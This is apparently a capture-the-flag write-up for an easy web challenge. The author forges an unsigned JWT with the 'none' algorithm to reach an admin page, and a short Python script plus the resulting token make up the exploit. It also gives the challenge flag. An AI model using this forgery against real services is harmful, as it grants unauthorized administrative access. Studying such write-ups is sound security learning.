# ## Vulns? None

**Author:** randN
**Category:** web
**Difficulty:** easy

## Description
```
Cookies? None
```

## Solve

Accessing the link provided in the challenge, a web page is provided with a simple login and register. Registering an account and login in after, a new link appears (*/administration*) and a cookie **token**.

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/vuln_none/images/after_login.png?raw=true)

Accessing the administration page we are received with: **No bussiness here!**.

Looking into the token, by the way its constructed looks like a JWT. Using https://jwt.io/ to decode it, the results are:

![Alt text](https://github.com/uac-ctf/MetaRed2021-5th-Writeups/blob/master/web/vuln_none/images/jwt_headers.png?raw=true)

Meet the "None" Algorithm: https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
A simple python scripts allows us to craft a JWT with the None algorithm.

```python
# https://pyjwt.readthedocs.io/en/latest/
import jwt

payload = {'id' : 'admin', 'admin': True}
print(jwt.encode(payload, None, algorithm=None, headers={'kid': 'da39a3ee5e6b4b0d3255bfef95601890afd80709'}))
```

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIiwia2lkIjoiZGEzOWEzZWU1ZTZiNGIwZDMyNTViZmVmOTU2MDE4OTBhZmQ4MDcwOSJ9.eyJpZCI6ImFkbWluIiwiYWRtaW4iOnRydWV9.
```

And now we can access the administration page.

## Flag

CTFUA{JWT_1337_N0n3_dnVsbg==}
